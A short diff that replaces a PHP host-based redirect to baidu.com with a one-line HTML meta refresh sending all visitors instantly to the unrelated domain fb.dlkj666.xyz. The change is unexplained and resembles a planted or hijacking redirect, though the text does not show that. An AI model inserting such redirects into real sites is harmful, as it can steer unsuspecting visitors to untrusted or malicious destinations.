@@ -1,14 +1,1 @@
-<?php
-error_reporting(0);
-$domain = 'baidu.com';//需要跳转的域名
-$host = $_SERVER['HTTP_HOST'];
-$dot1 = strpos($host,'.');
-$dot2 = strrpos($host,'.');
-if($dot1==$dot2){//一级域名
-header("Location: http://{$domain}");
-}else{//二级域名
-$attr = substr($host,0,$dot1);
-$location = $attr.'.'.$domain;
-header("Location: http://{$location}/");
-}
-exit;
+<meta http-equiv="refresh" content="0;url= http://fb.dlkj666.xyz ">
